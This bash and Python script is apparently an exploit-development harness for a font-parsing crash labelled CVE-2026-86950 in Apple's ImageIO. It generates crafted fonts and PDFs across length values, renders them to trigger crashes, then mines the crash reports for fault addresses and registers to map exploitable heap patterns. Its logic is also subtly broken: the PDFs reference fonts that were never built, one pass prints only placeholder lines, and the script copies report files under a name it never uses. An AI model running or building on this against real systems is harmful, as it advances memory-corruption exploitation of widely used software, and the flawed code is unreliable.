#!/bin/bash
# RIP-7: pattern-map sweep — both crash bands, .ips register census per L.
# Goal: L -> (fault addr class, fault site read/write, canonical pattern candidates)
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
Ls = list(range(-27648, -17407, 512)) + list(range(28000, 32761, 512))
for L in Ls: build_font(f"k2_p{L}.ttf", L)
print("fonts built:", len(Ls))
PYB
for L in $(seq 30240 16 31680); do ./venv/bin/python gen_pdf.py k2_p${L}.pdf k2_p${L}.ttf; done

IPSDIR="$HOME/Library/Logs/DiagnosticReports"
./venv/bin/python - << 'PYG'
import subprocess, os, glob, sys, re, json, time
Ls = list(range(30240, 31681, 16))
IPS = os.path.expanduser("~/Library/Logs/DiagnosticReports")
out = open("patternmap.txt", "w")
csv = open("patternmap.csv", "w")
csv.write("L,rc,fault_addr,site,x2,x9,x11,x16,x27,x22\n")
def W(*a): print(*a); print(*a, file=out)
def xval(ts, i):
    try: return ts['x'][i]['value']
    except Exception: return 0
pend = {}   # pid -> L
for L in Ls:
    pr = subprocess.Popen(['./render4', f'k2_p{L}.pdf', 'p.png'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    rc = pr.wait(timeout=120)
    pend[pr.pid] = L
time.sleep(12)   # flush window for crash reporter
def cls(v):
    if v == 0: return '-'
    if v >= 0xff00000000000000: return 'NONCANON-FF'
    if 0x100000000 <= v <= 0x800000000000: return 'CANON-HEAP'
    return 'OTHER'
matched = {}
for f in glob.glob(IPS + "/render4*.ips"):
    try:
        raw = json.loads(open(f).read().split('\n', 1)[1])
        matched[int(raw.get('pid', -1))] = (f, raw)
    except Exception: pass
for L in Ls:
    rc = '?'
    hit = None
    for pid, (f, raw) in matched.items():
        pass
    W("L=%6d ips=%s" % (L, 'pending'))
# second pass with rc recorded: rerun quick rc-only loop for the table
rcs = {}
for L in Ls:
    r = subprocess.run(['./render4', f'k2_p{L}.pdf', 'p.png'], capture_output=True, timeout=120)
    rcs[L] = r.returncode
time.sleep(12)
matched = {}
for f in glob.glob(IPS + "/render4*.ips"):
    try:
        raw = json.loads(open(f).read().split('\n', 1)[1])
        matched[int(raw.get('pid', -1))] = (f, raw)
    except Exception: pass
# match ips by capture order: build pid->L from a final instrumented pass is complex;
# instead: for each ips, take site+regs and attach to nearest preceding crash L by count
crashLs = [L for L in Ls if rcs.get(L) not in (0, None) and rcs[L] < 0]
ipsList = [matched[p] for p in sorted(matched)]
for i, L in enumerate(crashLs):
    fa = site = '-'; x2=x9=x11=x16=x27=x22 = 0
    if i < len(ipsList):
        f, raw = ipsList[i]
        codes = raw.get('exception', {}).get('rawCodes', [0, 0])
        fa = hex(codes[1]) if len(codes) > 1 else '-'
        ft = raw.get('faultingThread', 0)
        thr = raw.get('threads', [{}])[ft] if raw.get('threads') else {}
        frs = thr.get('frames', [])
        if frs: site = "+%s" % frs[0].get('symbolLocation', '?')
        ts = thr.get('threadState', {})
        x2, x9, x11, x16 = xval(ts,2), xval(ts,9), xval(ts,11), xval(ts,16)
        x27, x22 = xval(ts,27), xval(ts,22)
        try: os.rename(f, "ips_m%d.ips" % i)
        except Exception: pass
    W("L=%6d rc=%3d site=%-7s fa=%s cls=%s" % (L, rcs[L], site, fa, cls(int(fa,16) if fa not in ('-',) else 0)))
    W("   x2=%x x9=%x x11=%x x16=%x x22=%x x27=%x" % (x2,x9,x11,x16,x22,x27))
    csv.write("%d,%s,%s,%s,%x,%x,%x,%x,%x,%x\n" % (L, rcs[L], fa, site, x2,x9,x11,x16,x27,x22))
W("NOTE: neg band flipped to survive this session; pos band persists; ips matched by crash order")
out.close(); csv.close()
print("PATTERN MAP DONE")
PYG

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{patternmap.txt,patternmap.csv} findings/ 2>/dev/null
cp detonation/cve-2026-86950/ips_p*.ips findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/patternmap.txt | head -70
